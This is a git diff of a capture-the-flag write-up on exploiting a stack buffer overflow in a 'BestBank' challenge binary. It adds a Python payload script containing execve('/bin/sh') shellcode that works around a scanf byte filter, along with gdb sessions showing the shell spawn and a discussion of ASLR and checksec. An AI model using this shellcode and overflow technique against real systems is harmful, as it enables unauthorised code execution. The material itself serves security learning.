@@ -596,17 +596,17 @@ What about the payload? Compare the intended payload with the stack contents. It
 intended payload address
 v
 0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68  # stack
-            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload part 1
+            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload
             
 0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89  # stack
-            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload part 2
+            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload
 
 0xffffdd80:	0xc1	0x89	0xc2	0xb0	0x00	0xc0	0x04	0x08  # stack
-            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \x31  # payload part 3
+            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \x31  # payload
                                             ^ starting from this byte, the payload and stack do not match
 
 0xffffdd88:	0xa8	0xdd	0xff	0xff	0xb1	0x94	0x04	0x08  # stack
-            \xc0    \x40    \xcd    \x80                                  # payload part 4
+            \xc0    \x40    \xcd    \x80                                  # payload
 ...
 ```
 
@@ -732,14 +732,95 @@ mov al,0xff     0xb0 0xff
 sub al,0xf4     0x2c 0xf4
 ```
 
-Exploit Version 2: Execute Shell
+### Exploit Version 2: Execute Shell
 
-Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new exploit script to include these changes. 
+Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new [exploit script](exploit2.py) to take advantage of this new information. Remove the `b0 0b` bytes from the original shell code and add in the `mov` and `sub` opcodes:
+```python
+import struct
 
+eip = struct.pack("I", 0xffffdd6c + 4)
 
-# TODO
-TODO: remove all /zionperez/ folder names
-## Draft Section
+# mov al,0xff     0xb0 0xff
+# sub al,0xf4     0x2c 0xf4
+mov = b'\xb0\xff'
+sub = b'\x2c\xf4'
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2'
+shellcode += mov + sub + b'\xcd\x80\x31\xc0\x40\xcd\x80'
+
+payload = b'1 ' + b'A' * 1012 + b'BBBB' + eip + shellcode
+
+with open("payload", "wb") as handle:
+    handle.write(payload)
+```
+
+Run the payload in gdb and stop at the `0x8049277: ret` instruction. Examine the stack and verify that the entire payload made it:
+```
+(gdb) x/48bx $esp+4
+0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68    # stack
+            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68    # payload
+
+0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89    # stack
+            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89    # payload
+
+0xffffdd80:	0xc1	0x89	0xc2	0xb0	0xff	0x2c	0xf4	0xcd    # stack
+            \xc1    \x89    \xc2    \xb0    \xff    \x2c    \xf4    \xcd    # payload
+
+0xffffdd88:	0x80	0x31	0xc0	0x40	0xcd	0x80	0x00	0x08    # stack
+            \x80    \x31    \xc0    \x40    \xcd    \x80    ^ null          # payload
+```
+
+Success! The payload was fully copied into the stack. Continue the program:
+```
+(gdb) c
+Continuing.
+process 25937 is executing new program: /bin/dash
+```
+
+The program successfully execute the shell program `/bin/dash`. Awesome! 
+
+Now run it without gdb. The program segfaults:
+```
+$ ./bank < payload
+Welcome to the Best Bank!
+...
+Segmentation fault (core dumped)
+```
+
+To figure out why, run the program again in one terminal:
+```
+$ ./bank
+```
+
+In another terminal window, run gdb while attaching to the running bank program:
+```
+$ sudo gdb -p `pidof bank`
+```
+
+Set a breakpoint at the familiar `0x8049276` address and continue:
+```
+(gdb) break *0x8049276
+(gdb) continue
+```
+
+Enter input as normal in the bank's terminal window until the breakpoint hits in the gdb window. Once the breakpoint hits, examine the stack pointer `esp`:
+```
+(gdb) info registers esp
+esp            0xffa73dd0	0xffa73dd0
+```
+
+This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address used in gdb cannot be used on a live program. Furthermore, gdb has ASLR turned off by default for easier debugging. To turn ASLR on, use this command:
+```
+(gdb) set disable-randomization off
+```
+
+To turn ASLR back off (default setting), use this:
+```
+(gdb) set disable-randomization on
+```
+
+### Checksec and Proc Maps
+
+Before attempting to defeat ASLR, ensure to explore all other options. Check the program's security settings with `checksec`:
 ```
 $ checksec bank
 [*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
@@ -749,31 +830,40 @@ $ checksec bank
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
     RWX:      Has RWX segments
-zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
-zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
-16264
-zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/16264/maps
-cat: proc/16264/maps: No such file or directory
-zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/
-cat: proc/: No such file or directory
-zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat /proc/16264/maps
+```
+
+This gives a lot of good information. `NX` in `NX disabled` stands for non-execute. With this disabled, there are areas of the program that can be overwritten and executed, which is great for hacking purposes. `PIE` stands for Position Independent Executable. If enabled, PIE further randomizes the memory location that the program executes on. Having this disabled is also great. There is a lot more information about these codes in this article: [Binary Executable Security][10].
+
+If `NX` is disabled for some areas, which areas of memory are executable? Find out with the program's **proc map**. Run bank in a new terminal. In another terminal, print the proc map like this:
+```
+$ pidof bank
+28447
+$ cat /proc/28447/maps
+```
+
+The output looks similar to this. The column headers were added for convenience.
+```
+Start    End Addr RWX? Offset                                            Location/Description
 08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
 0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
 0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-f7d0c000-f7ee1000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7ee1000-f7ee2000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7ee2000-f7ee4000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7ee4000-f7ee5000 rwxp 001d7000 fd:01 8130741                            /lib/i]linux-gnu/libc-2.27.so
-f7ee5000-f7ee8000 rwxp 00000000 00:00 0 
-f7f04000-f7f06000 rwxp 00000000 00:00 0 
-f7f06000-f7f09000 r--p 00000000 00:00 0                                  [vvar]
-f7f09000-f7f0a000 r-xp 00000000 00:00 0                                  [vdso]
-f7f0a000-f7f30000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7f30000-f7f31000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7f31000-f7f32000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-ffc2d000-ffc4e000 rwxp 00000000 00:00 0                                  [stack]
+f7d93000-f7f68000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f68000-f7f69000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f69000-f7f6b000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f6b000-f7f6c000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f6c000-f7f6f000 rwxp 00000000 00:00 0 
+f7f8b000-f7f8d000 rwxp 00000000 00:00 0 
+f7f8d000-f7f90000 r--p 00000000 00:00 0                                  [vvar]
+f7f90000-f7f91000 r-xp 00000000 00:00 0                                  [vdso]
+f7f91000-f7fb7000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7fb7000-f7fb8000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7fb8000-f7fb9000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+ff850000-ff871000 rwxp 00000000 00:00 0                                  [stack]
 ```
 
+If you run bank multiple times and print its proc map again, you'll find that the `f7d93000` addresses always change due to ASLR. However, `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.
+
+# DRAFT SECTION:
 On further research, the `scanf` function appears to be vulnerable to overflow attacks. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
 
 Important breakpoints:
@@ -787,29 +877,6 @@ Num     Type           Disp Enb Address         What
 8       breakpoint     keep y   0x08049208      captcha: instruction after printf
 ```
 
-
-```
-https://stackoverflow.com/questions/16376341/isoc99-scanf-and-scanf
-__isoc99_scanf and scanf
-```
-
-```
-captchaImage = 
- _    _____    _____ _       _          _  __
-| |__|___ / __|_   _| |__   / \   _ __ | |/ /
-| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
-| |_) |__) \__ \| | | |_) / ___ \| | | | . \
-|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
-
-
- _    _____    _____ _       _          _  __
-| |__|___ / __|_   _| |__   / \   _ __ | |/ /
-| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
-| |_) |__) \__ \| | | |_) / ___ \| | | | . \
-|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
-```
-
-
 ```
 (gdb) starti
 
@@ -822,16 +889,10 @@ $ gcc -ggdb -fno-stack-protector scanf.c -o scan
 ```
 https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb
 
-https://www.youtube.com/watch?v=HSlhY4Uy8SA
-
 ```
 to get a good return address for the $rsp run program again, si after the ret
 and look at the $rsp address.
 ```
-
-7.2 Example Debugging Session: Segmentation Fault Example
-http://www.unknownroad.com/rtfm/gdbtut/gdbsegfault.html
-
 
 
 https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector
@@ -1171,25 +1232,6 @@ Enter your choice:  _    _____    _____ _       _          _  __
 Captcha: Incorrect!
 
 Segmentation fault (core dumped)
-```$ checksec --file bank
-[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-```
-
-```
-$ checksec --file bank
-[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
 ```
 Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.
 https://ctf101.org/binary-exploitation/stack-canaries/
@@ -1529,36 +1571,16 @@ $ sudo gdb -p `pidof bank`
     ^^^ these middle bits change due to ASLR
 ```
 
-
+Submit the flag:
 ```
-$ cat /proc/25183/maps
-08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-^ this section     ^ has write permissions..
-f7dae000-f7f83000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f83000-f7f84000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f84000-f7f86000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f86000-f7f87000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f87000-f7f8a000 rwxp 00000000 00:00 0 
-f7fa6000-f7fa8000 rwxp 00000000 00:00 0 
-f7fa8000-f7fab000 r--p 00000000 00:00 0                                  [vvar]
-f7fab000-f7fac000 r-xp 00000000 00:00 0                                  [vdso]
-f7fac000-f7fd2000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7fd2000-f7fd3000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7fd3000-f7fd4000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-ff9ed000-ffa0e000 rwxp 00000000 00:00 0                                  [stack]
-```
-
 LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
-
-This challenge took over 7 days to complete..
+```
 
 ## Notes to Self
+Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020. It took nine (9) days of debugging, learning, and grinding to solve. This is my first buffer-overflow payload-to-shell exploit and I have learned a ton. This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips *most* of these trials and instead focuses on the path to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. Happy hacking. 
 
-Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020. It took nine (9) days of debugging, learning, and grinding to solve. This is my first buffer-overflow payload-to-shell exploit and I have learned a ton. 
-
-This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips most of these trials and instead details the best path to get to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. In that journey, I have learned about addrses space layout randomization (ASLR), format string exploits, the global offset table (GOT), the procedure linkage table (PLT), stack canaries, and many other concepts. These concepts and others have been linked in the resources section below.
+# TODO
+TODO: remove all /zionperez/ folder names
 
 ## Resources
 * [Wikipedia: scanf format string][1]
@@ -1569,6 +1591,9 @@ This challenge involved an incredible amount of trial-and-error. However, the so
 * [StackOverflow: Assembly "leave" instruction][6]
 * [StackOverflow: What is x86 "ret" instruction equivalent to?][7]
 * [Wikipedia: X86 Assembly/X86 Architecture][8]
+* [Wikipedia: Address Space Layout Randomization][9]
+* [Sven Vermeulen: Binary Executable Security][10]
+* [Debugging Session: Segmentation Fault Example][11]
 
 [1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
 [2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
@@ -1578,3 +1603,6 @@ This challenge involved an incredible amount of trial-and-error. However, the so
 [6]:https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
 [7]:https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
 [8]:https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture
+[9]:https://en.wikipedia.org/wiki/Address_space_layout_randomization
+[10]:http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/
+[11]:http://www.unknownroad.com/rtfm/gdbtut/gdbsegfault.html
